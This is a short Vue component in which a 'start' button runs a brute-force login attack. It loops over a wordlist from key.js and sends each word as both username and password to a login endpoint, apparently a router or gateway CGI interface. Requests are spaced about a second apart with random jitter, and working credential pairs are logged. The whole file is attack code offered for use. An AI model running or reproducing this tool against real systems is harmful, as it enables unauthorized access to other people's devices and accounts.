<template>
  <div>
    <p @click="start">开始</p>
    <p>暂停</p>
  </div>
</template>

<script>
  const key = require('./key.js')
  export default {
    components: {
    },

    data () {
      return {
        usr: 'admin',
        pwd: 'admin',
        time: null
      }
    },
    methods: {
      start: function () {
        let _arr = key.wd
        for (let i = 0; i < _arr.length; i++) {
          // 生成随机数 大约一秒 请求一次
          let _t = Math.ceil(Math.random() * 200) + 900
          setTimeout(() => {
            this.post(_arr[i], _arr[i])
          }, _t * i)
        }
      },
      post: function (usr, pwd) {
        let _this = this
        _this.$request({
          baseURL: '',
          // url: '/post/cgi-bin/gw.cgi',
          url: '/post/index/Login/index',
          type: 'GET',
          params: {
            admin: `${usr}`,
            userName: `${usr}`,
            password: `${pwd}`,
            password2: `${pwd}`,
            _: new Date().getTime()
          }
        }).then(res => {
          if (res.code === '1') {
            console.log(res, `userName: ${usr},password: ${pwd}`)
          }
        })
      }
    },
    watch: {
    },
    created: function () {

    },
    mounted () {
      this.$nextTick(() => {
      })
    },
    beforeDestroy () {
    }

  }
</script>

<style lang="less" scoped>

</style>
